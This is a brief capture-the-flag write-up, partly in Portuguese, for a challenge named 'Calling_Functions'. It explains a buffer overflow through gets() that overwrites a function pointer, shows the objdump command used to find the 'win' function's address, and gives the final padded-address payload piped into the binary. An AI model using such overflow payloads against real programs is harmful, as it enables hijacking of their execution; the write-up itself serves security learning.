# Challenge `Calling_Functions` writeup

- Vulnerability: What type of vulnerability is being exploited
  - buffer overflow
- Where: Where is the vulnerability present
  - gets function
- Impact: What results of exploiting this vulnerability
  - Redirecionar a execução do programa

## Steps to reproduce

1. Ao ler o codigo percebi que para ter acesso à função win só era preciso fazer overwrite da variavel fp, para isso
fui submetendo chars até dar segfault (-1) em seguida redirecionei o programa para a função win ao escrever o endereço da função win
2. Para procurar o endereço da func win fiz: objdump -x functions | grep win
3. Payload final: python -c "print'A'*32+'\xf1\x86\x04\x08'" | ./functions

